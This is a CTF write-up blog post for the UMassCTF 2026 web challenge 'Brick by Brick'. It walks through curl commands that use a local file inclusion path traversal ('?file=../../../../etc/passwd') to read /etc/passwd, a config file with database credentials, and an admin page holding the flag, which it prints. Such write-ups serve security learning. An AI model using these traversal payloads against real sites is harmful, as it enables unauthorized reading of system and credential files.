---
layout: post
title:  "Brick by Brick"
date:   2026-04-13 18:52:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /UMassCTF-2026-brick-by-brick/
---

**Category**: web easy

**Author**: Michael/michaelye_22

**Description**: I found this old portal for BrickWorks Co. They say their internal systems are secure, but I'm not so sure. Can you find the hidden admin dashboard and get the flag?
[http://brick-by-brick.web.ctf.umasscybersec.org](http://brick-by-brick.web.ctf.umasscybersec.org)

I go the site and it says it is under maintenance:

![Alt text](/images/umassweb1.png)

Looking at `robots.txt`:
```shell
curl http://brick-by-brick.web.ctf.umasscybersec.org/robots.txt  
User-agent: *  
Disallow: /internal-docs/assembly-guide.txt  
Disallow: /internal-docs/it-onboarding.txt  
Disallow: /internal-docs/q3-report.txt  
  
# NOTE: Maintenance in progress.  
# Unauthorized crawling of /internal-docs/ is prohibited.
```

While looking at each text file I find `it-onboarding.txt` contains a note about a sensitive file parameter:
```shell
curl http://brick-by-brick.web.ctf.umasscybersec.org/internal-docs/it-onboarding.txt  
================================================================  
BRICKWORKS CO. — IT ONBOARDING GUIDE  
Document ID: IT-OB-2024-003  
Classification: INTERNAL USE ONLY  
================================================================  
  
Welcome to the BrickWorks IT team! This document covers system  
access and tooling for new employees.  
  
----------------------------------------------------------------  
SECTION 1 - DOCUMENT PORTAL  
----------------------------------------------------------------  
  
The internal document portal lives at our main intranet address.  
Staff can access any file using the ?file= parameter:  
  
----------------------------------------------------------------  
SECTION 2 - ADMIN DASHBOARD  
----------------------------------------------------------------  
  
Credentials are stored in the application config file  
for reference by the IT team. See config.php in the web root.  
  
----------------------------------------------------------------  
SECTION 3 - CONTACTS  
----------------------------------------------------------------  
  
IT Helpdesk:   helpdesk@brickworks.internal  
Sysadmin Lead: ops@brickworks.internal  
  
================================================================  
END OF DOCUMENT  
================================================================
```

While testing `?file=` I find LFI:
```shell
curl http://brick-by-brick.web.ctf.umasscybersec.org/?file=../../../../etc/passwd  
<pre>root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
</pre>
```

I find `index.php` exists so I look at `config.php`:
```shell
curl http://brick-by-brick.web.ctf.umasscybersec.org/?file=config.php  
<pre>&lt;?php  
// BrickWorks Co. — Application Configuration  
// WARNING: Do not expose this file publicly!  
  
// The admin dashboard is located at /dashboard-admin.php.  
  
// Database  
define(&#039;DB_HOST&#039;, &#039;localhost&#039;);  
define(&#039;DB_NAME&#039;, &#039;brickworks&#039;);  
define(&#039;DB_USER&#039;, &#039;brickworks_app&#039;);  
define(&#039;DB_PASS&#039;, &#039;Br1ckW0rks_db_2024!&#039;);  
  
// WARNING: SYSTEM IS CURRENTLY USING DEFAULT FACTORY CREDENTIALS.  
// TODO: Change &#039;administrator&#039; account from default password.  
  
define(&#039;ADMIN_USER&#039;, &#039;administrator&#039;);  
define(&#039;ADMIN_PASS&#039;, &#039;[deleted it for safety reasons - Tom]&#039;);  
  
// App settings  
define(&#039;APP_ENV&#039;, &#039;production&#039;);  
define(&#039;APP_DEBUG&#039;, false);  
define(&#039;APP_VERSION&#039;, &#039;1.0.3&#039;);  
</pre>
```

Get the flag:
```shell
curl http://brick-by-brick.web.ctf.umasscybersec.org/?file=dashboard-admin.php | head -n 10  
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
Dload  Upload   Total   Spent    Left  Speed  
0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:-- 0<pre>&lt;?php  
session_start();  
  
// Default credentials - intentionally weak for CTF  
define(&#039;DASHBOARD_USER&#039;, &#039;administrator&#039;);  
define(&#039;DASHBOARD_PASS&#039;, &#039;administrator&#039;);  
define(&#039;FLAG&#039;, &#039;UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}&#039;);  
  
$error = &#039;&#039;;  
$logged_in = isset($_SESSION[&#039;logged_in&#039;]) &amp;&amp; $_SESSION[&#039;logged_in&#039;] === true;  
100 13643    0 13643    0     0  35681      0 --:--:-- --:--:-- --:--:-- 35714
```

Or login with the default creds:

![Alt text](/images/umassweb2.png)

`UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}`